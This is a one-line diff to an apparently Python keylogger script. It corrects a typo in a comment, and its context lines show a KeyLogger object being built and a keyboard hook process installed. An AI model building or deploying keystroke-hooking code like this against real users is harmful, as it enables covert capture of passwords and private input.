@@ -102,7 +102,7 @@ def print_key_logger_info(file_name, hook_start=False, hook_end=False):
 message hooking starts..
 """
 if __name__ == '__main__':
-    # Construct KeyLogger object and set ready for hookingw
+    # Construct KeyLogger object and set ready for hooking
     key_logger = KeyLogger()
     ptr = get_function_ptr(hook_process)
     key_logger.install_hook_process(ptr)
